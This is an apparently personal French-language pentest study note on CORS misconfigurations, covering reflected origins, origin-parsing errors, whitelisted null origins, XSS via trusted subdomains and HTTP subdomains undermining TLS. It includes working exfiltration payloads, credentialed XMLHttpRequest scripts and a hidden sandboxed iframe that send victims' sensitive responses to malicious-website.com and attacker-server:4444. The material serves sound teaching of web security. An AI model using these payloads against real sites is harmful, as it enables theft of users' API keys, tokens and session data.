# Cross-origin resource sharing (CORS)

Partage de ressources multi-origines ou partage de ressources d'origine croisée.

- [Same-origin policy (SOP)](./Same-origin%20policy.md)

- [CORS and the Access-Control-Allow-Origin response header](./CORS%20and%20the%20Access-Control-Allow-Origin%20response%20header.md)

- [Vérifications avant vol](./Vérifications%20avant%20vol.md)

# Vulnerabilities

Un serveur Web cible est vulnérable aux attaques CORS si :

```sh
# request
Origin: https://attacker-website.com
```
Pour déterminer si CORS est activé, recherchez les en-têtes commençant par `Access-Control-Allowed` dans les en-têtes de réponse.

```sh
# response
Access-Control-Allow-Origin: *
Access-Control-Allow-Origin: https://attacker-website.com
Access-Control-Allow-Credentials: true
```


Les vulnérabilités possibles:

## 1. Server-generated ACAO header from client-specified Origin header
Certaines applications doivent donner accès à un certain nombre d'autres domaines.

```sh
# request
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

```sh
# response
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

Ces en-têtes indiquent que l'accès est autorisé à partir du domaine demandeur ( `malicious-website.com`) et que les requêtes cross-origin peuvent inclure des cookies ( `Access-Control-Allow-Credentials: true`) et sera donc traité en session. 

> **Parce que l'application reflète des origines arbitraires dans l'en-tête `Access-Control-Allow-Origin` , cela signifie qu'absolument n'importe quel domaine peut accéder aux ressources du domaine vulnérable**

Si la réponse contient des informations sensibles telles qu'une clé API ou un jeton CSRF, vous pouvez les récupérer en plaçant le script suivant sur votre site Web : 

```html
<script>
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
	req.withCredentials = true;
	req.send();

	function reqListener() {
		location='//malicious-website.com/log?key='+this.responseText;
	};
</script>
```

Now visite the attacker web site `https://malicious-website.com/`


## 2. Errors parsing Origin headers
Erreurs lors de l'analyse des en-têtes Origin

Des règles sont souvent implémentées en faisant correspondre les `préfixes` ou `suffixes` d'URL

Par exemple, supposons qu'une application accorde l'accès à tous les domaines se terminant par : `normal-website.com`

- Un attaquant pourrait pouvoir accéder en enregistrant le domaine : `hackersnormal-website.com`

Alternativement, supposons qu'une application accorde l'accès à tous les domaines commençant par `normal-website.com`

- Un attaquant pourrait être en mesure d'accéder à l'aide du domaine : `normal-website.com.evil-user.net`

## 3. Whitelisted null origin value

Les navigateurs peuvent envoyer la valeur `Origin: null` dans l'en-tête.

Certaines applications peuvent mettre sur liste blanche l'`Origin: null` pour accompagner le développement local de l’application.

```sh
# request
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: null
```

```sh
# response
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

Dans cette situation, un attaquant peut générer une requête cross-origin contenant la valeur null dans l’en-tête Origine. Cela satisfera la liste blanche, conduisant à un accès inter-domaines.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','vulnerable-website.com/sensitive-victim-data',true);
	req.withCredentials = true;
	req.send();

	function reqListener() {
		location='malicious-website.com/log?key='+this.responseText;
	};
</script>">
</iframe>
```

```html
<iframe style="display: none;" sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
    var xhr = new XMLHttpRequest();
    var target_url = 'https://vulnerable-website.com/sensitive-victim-data';
    xhr.onreadystatechange = () => {
        if(xhr.readyState == XMLHttpRequest.DONE){
            fetch('http://attacker-server:4444/log?key=' + xhr.responseText);
        }
    };
    xhr.open('GET', target_url, true);
    xhr.withCredentials = true;
    xhr.send(null);
</script>"></iframe>
```

## 4. Exploiting XSS via CORS trust relationships
> Même CORS « correctement » configuré établit une relation de confiance entre deux origines.

```sh
# request
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

```sh
# response
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Un attaquant qui trouve une vulnérabilité XSS sur `subdomain.vulnerable-website.com` pourrait l'utiliser pour récupérer la clé API, en utilisant une URL telle que:

```sh
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

## 5. Breaking TLS with poorly configured CORS

Supposons qu'une application qui utilise rigoureusement HTTPS mette également sur liste blanche un sous-domaine approuvé qui utilise HTTP simple.

```sh
# request
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

```sh
# response
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Dans cette situation, un attaquant capable d'intercepter le trafic d'un utilisateur victime et exploiter la configuration CORS pour compromettre l'interaction de la victime avec l'application avec les étapes suivantes :


1. L'utilisateur victime effectue une requête HTTP simple.

2. L'attaquant injecte une redirection vers :

```
http://trusted-subdomain.vulnerable-website.com
```

3. Le navigateur de la victime suit la redirection.

4. L'attaquant intercepte la requête HTTP simple et renvoie une réponse usurpée contenant une requête CORS à:

```
https://vulnerable-website.com
```

5. Le navigateur de la victime fait la requête CORS, en incluant l'origine :

```
http://trusted-subdomain.vulnerable-website.com
```

6. L'application autorise la demande car il s'agit d'une origine sur liste blanche . Les données sensibles demandées sont renvoyées dans la réponse.

7. La page usurpée de l'attaquant peut lire les données sensibles et les transmettre à n'importe quel domaine sous le contrôle de l'attaquant.

> Cette attaque est efficace car même si le site utilise des mesures de sécurité comme HTTPS, n'accepte pas de connexions HTTP, et protège bien les cookies, l'attaque peut quand même réussir. 

